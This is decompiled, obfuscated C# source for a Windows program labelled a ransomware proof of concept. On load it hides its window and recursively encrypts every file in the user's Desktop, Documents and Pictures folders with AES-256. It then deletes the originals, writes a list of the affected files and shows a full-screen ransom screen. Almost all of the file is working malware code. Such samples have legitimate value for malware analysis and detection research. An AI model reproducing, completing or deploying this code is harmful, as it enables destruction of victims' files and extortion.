using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using R2ujhcKxVgITXpqg9X;

namespace RansomwarePOC;

public class Form1 : Form
{
	private static string ipdgrEBA3 = "";

	private string LMj9COF0A = sMk8wArgfJX2hbRXDA.N5lXuuIcUm(0);

	private string PEXDR7yjd = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string E4Z3so5F5 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string UuZC3VT3w = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int ohuTPvL9G = 0;

	private IContainer tGxJ2hdgb = null;

	private Label raai6Bf9b;

	private Label iuWFCHK8M;

	private Label LPGempS3d;

	private TextBox QiVSfVaoU;

	private TextBox PrEAhPupk;

	private Label YZCIfBngc;

	private Label Lh4sQEqbM;

	private PictureBox GijwmUm8B;

	public Form1()
	{
		CrZ56IdeC();
	}

	private void EbKlkBqwh(object sender, EventArgs e)
	{
		VfnO50FyE();
		vVPmuidIf(PEXDR7yjd);
		vVPmuidIf(UuZC3VT3w);
		vVPmuidIf(E4Z3so5F5);
		if (ohuTPvL9G > 0)
		{
			fQld3eGey();
			dNxkcSG5P();
		}
		else
		{
			Console.Out.WriteLine(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(604));
			Application.Exit();
		}
	}

	private void dNxkcSG5P()
	{
		StreamWriter streamWriter = new StreamWriter(PEXDR7yjd + sMk8wArgfJX2hbRXDA.N5lXuuIcUm(648));
		streamWriter.WriteLine(LMj9COF0A);
		streamWriter.WriteLine(ipdgrEBA3);
		streamWriter.Close();
	}

	private void fQld3eGey()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)raai6Bf9b).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(714) + ohuTPvL9G + sMk8wArgfJX2hbRXDA.N5lXuuIcUm(756));
	}

	private void VfnO50FyE()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)iuWFCHK8M).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(804));
		((Control)QiVSfVaoU).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(916));
		((Control)PrEAhPupk).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(988));
		((Control)iuWFCHK8M).Focus();
	}

	private static void vVPmuidIf(string string_0)
	{
		try
		{
			string[] files = Directory.GetFiles(string_0);
			foreach (string text in files)
			{
				if (!text.Contains(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1048)))
				{
					Console.Out.WriteLine(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1066) + text);
					FfihFh6NA(text, sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1094));
				}
			}
			string[] directories = Directory.GetDirectories(string_0);
			foreach (string string_ in directories)
			{
				vVPmuidIf(string_);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FfihFh6NA(string string_0, string string_1)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(string_0 + sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1048), FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1116) + ex.Message);
		}
		finally
		{
			ipdgrEBA3 = ipdgrEBA3 + string_0 + sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1134);
			ohuTPvL9G++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(string_0);
		}
	}

	private static void h4uRSIU07(string string_0, string string_1, string string_2)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_2);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(string_0, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(string_1, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1140) + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1116) + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1204) + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void V3tZn3GFp(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && tGxJ2hdgb != null)
		{
			tGxJ2hdgb.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void CrZ56IdeC()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Expected O, but got Unknown
		//IL_01a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Expected O, but got Unknown
		//IL_0267: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_0320: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bd: Expected O, but got Unknown
		//IL_03e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0475: Unknown result type (might be due to invalid IL or missing references)
		//IL_047f: Expected O, but got Unknown
		//IL_04b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_053b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0545: Expected O, but got Unknown
		//IL_0576: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fa: Expected O, but got Unknown
		//IL_072d: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		raai6Bf9b = new Label();
		iuWFCHK8M = new Label();
		LPGempS3d = new Label();
		QiVSfVaoU = new TextBox();
		PrEAhPupk = new TextBox();
		YZCIfBngc = new Label();
		Lh4sQEqbM = new Label();
		GijwmUm8B = new PictureBox();
		((ISupportInitialize)GijwmUm8B).BeginInit();
		((Control)this).SuspendLayout();
		((Control)raai6Bf9b).set_Anchor((AnchorStyles)14);
		((Control)raai6Bf9b).set_Font(new Font(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1270), 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)raai6Bf9b).set_ForeColor(Color.White);
		((Control)raai6Bf9b).set_Location(new Point(411, 76));
		((Control)raai6Bf9b).set_Margin(new Padding(4, 0, 4, 0));
		((Control)raai6Bf9b).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1314));
		((Control)raai6Bf9b).set_Size(new Size(840, 72));
		((Control)raai6Bf9b).set_TabIndex(0);
		((Control)raai6Bf9b).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1334));
		raai6Bf9b.set_TextAlign((ContentAlignment)32);
		((Control)iuWFCHK8M).set_Anchor((AnchorStyles)14);
		((Control)iuWFCHK8M).set_Font(new Font(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1270), 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)iuWFCHK8M).set_ForeColor(Color.White);
		((Control)iuWFCHK8M).set_Location(new Point(478, 240));
		((Control)iuWFCHK8M).set_Margin(new Padding(4, 0, 4, 0));
		((Control)iuWFCHK8M).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1422));
		((Control)iuWFCHK8M).set_Size(new Size(687, 112));
		((Control)iuWFCHK8M).set_TabIndex(1);
		((Control)iuWFCHK8M).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1458));
		iuWFCHK8M.set_TextAlign((ContentAlignment)32);
		((Control)LPGempS3d).set_Anchor((AnchorStyles)14);
		((Control)LPGempS3d).set_Font(new Font(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1270), 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LPGempS3d).set_ForeColor(Color.White);
		((Control)LPGempS3d).set_Location(new Point(160, 430));
		((Control)LPGempS3d).set_Margin(new Padding(4, 0, 4, 0));
		((Control)LPGempS3d).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1570));
		((Control)LPGempS3d).set_Size(new Size(1106, 145));
		((Control)LPGempS3d).set_TabIndex(2);
		((Control)LPGempS3d).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1586));
		LPGempS3d.set_TextAlign((ContentAlignment)32);
		((Control)QiVSfVaoU).set_Anchor((AnchorStyles)2);
		((Control)QiVSfVaoU).set_Font(new Font(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1270), 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)QiVSfVaoU).set_Location(new Point(334, 356));
		((Control)QiVSfVaoU).set_Margin(new Padding(4, 4, 4, 4));
		((Control)QiVSfVaoU).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1706));
		((TextBoxBase)QiVSfVaoU).set_ReadOnly(true);
		((Control)QiVSfVaoU).set_Size(new Size(901, 53));
		((Control)QiVSfVaoU).set_TabIndex(3);
		((Control)QiVSfVaoU).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(916));
		QiVSfVaoU.set_TextAlign((HorizontalAlignment)2);
		((Control)PrEAhPupk).set_Anchor((AnchorStyles)2);
		((Control)PrEAhPupk).set_Font(new Font(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1270), 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)PrEAhPupk).set_Location(new Point(334, 548));
		((Control)PrEAhPupk).set_Margin(new Padding(4, 4, 4, 4));
		((Control)PrEAhPupk).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1744));
		((TextBoxBase)PrEAhPupk).set_ReadOnly(true);
		((Control)PrEAhPupk).set_Size(new Size(901, 53));
		((Control)PrEAhPupk).set_TabIndex(4);
		((Control)PrEAhPupk).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1778));
		PrEAhPupk.set_TextAlign((HorizontalAlignment)2);
		((Control)YZCIfBngc).set_Anchor((AnchorStyles)14);
		((Control)YZCIfBngc).set_Font(new Font(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1270), 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)YZCIfBngc).set_ForeColor(Color.White);
		((Control)YZCIfBngc).set_Location(new Point(228, 148));
		((Control)YZCIfBngc).set_Margin(new Padding(4, 0, 4, 0));
		((Control)YZCIfBngc).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1848));
		((Control)YZCIfBngc).set_Size(new Size(1219, 107));
		((Control)YZCIfBngc).set_TabIndex(5);
		((Control)YZCIfBngc).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1864));
		YZCIfBngc.set_TextAlign((ContentAlignment)2);
		((Control)Lh4sQEqbM).set_Anchor((AnchorStyles)14);
		((Control)Lh4sQEqbM).set_Font(new Font(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1270), 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Lh4sQEqbM).set_ForeColor(Color.Crimson);
		((Control)Lh4sQEqbM).set_Location(new Point(16, 956));
		((Control)Lh4sQEqbM).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Lh4sQEqbM).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1932));
		((Control)Lh4sQEqbM).set_Size(new Size(1219, 87));
		((Control)Lh4sQEqbM).set_TabIndex(8);
		((Control)Lh4sQEqbM).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1948));
		Lh4sQEqbM.set_TextAlign((ContentAlignment)32);
		GijwmUm8B.set_Image((Image)componentResourceManager.GetObject(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1954)));
		((Control)GijwmUm8B).set_Location(new Point(113, 76));
		((Control)GijwmUm8B).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(1992));
		((Control)GijwmUm8B).set_Size(new Size(274, 264));
		GijwmUm8B.set_TabIndex(9);
		GijwmUm8B.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkBlue);
		((Form)this).set_ClientSize(new Size(1251, 1055));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)GijwmUm8B);
		((Control)this).get_Controls().Add((Control)(object)Lh4sQEqbM);
		((Control)this).get_Controls().Add((Control)(object)YZCIfBngc);
		((Control)this).get_Controls().Add((Control)(object)PrEAhPupk);
		((Control)this).get_Controls().Add((Control)(object)QiVSfVaoU);
		((Control)this).get_Controls().Add((Control)(object)LPGempS3d);
		((Control)this).get_Controls().Add((Control)(object)iuWFCHK8M);
		((Control)this).get_Controls().Add((Control)(object)raai6Bf9b);
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Form)this).set_Margin(new Padding(4, 4, 4, 4));
		((Control)this).set_Name(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(2018));
		((Control)this).set_Text(sMk8wArgfJX2hbRXDA.N5lXuuIcUm(2032));
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)EbKlkBqwh);
		((ISupportInitialize)GijwmUm8B).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
